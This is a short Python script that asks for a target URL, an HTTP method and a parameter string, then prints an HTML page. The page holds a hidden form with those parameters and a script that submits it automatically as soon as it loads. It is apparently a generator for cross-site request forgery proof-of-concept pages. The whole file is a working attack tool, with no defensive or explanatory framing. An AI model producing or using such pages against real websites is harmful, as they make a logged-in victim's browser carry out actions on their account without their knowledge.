action_url = input("Action url: ")
method = input("Action method: ")
params = input("String source: ")
params = params.split("&")
print("<html><body>\n\r<form action=\"{}\" method=\"{}\">".format(action_url, method))
for x in range(len(params)):
	print("\r\r<input type=\"hidden\" name=\"{}\" value=\"{}\">".format(params[x].split("=")[0], params[x].split("=")[1]))
print("\r</form>\n\r<script>document.forms[0].submit()</script>")	
print("</body></html>")	
